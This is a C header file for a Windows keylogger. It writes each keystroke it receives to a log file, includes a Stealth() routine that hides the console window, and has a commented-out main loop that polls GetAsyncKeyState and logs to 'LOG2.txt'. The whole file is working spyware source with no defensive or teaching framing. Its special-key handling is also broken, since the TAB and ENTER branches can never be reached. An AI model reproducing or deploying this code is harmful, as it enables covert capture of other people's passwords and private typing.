#ifndef KEYLOGGER_H
#define KEYLOGGER_H

void Stealth();
int keylogger_background(int keyStroke, char *file);

int keylogger_background(int keyStroke, char *file)
{


        char c = keyStroke;

        if ((keyStroke == 1) || (keyStroke == 2))
        return 0;

        

        FILE * OUTPUT_FILE;
        OUTPUT_FILE = fopen(file, "a+");


        //if(c == 'z')   { break; };
        if (c != 8)
        {
            printf("%c", c);
            fputc(c, OUTPUT_FILE);
            printf("\n %d", c);
        } 
        else if (c == 8) 
        {
            printf("[DELETE]");
            fputs ("[DELETE]", OUTPUT_FILE);
        }
        else if (c == 9)
        {
            printf("[TAB]");
            fputs ("[TAB]", OUTPUT_FILE);
        }
        else if (c == 13)
        {
            printf("[ENTER]");
            fputs ("[ENTER]", OUTPUT_FILE);
        }

        fclose(OUTPUT_FILE);
        return 0;
   
    /* 27 is the ASCII code for Esc */
}

// int main() {
//     Stealth();
//     char i;

//     while (1) {
//         for(i = 8; i <= 190; i++) {
//             if (GetAsyncKeyState(i) == -32767)
//                 keylogger_background(i, "LOG2.txt");
//         }
//     }
//     system("PAUSE");
//     return 0;
// }

void Stealth() {
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

#endif
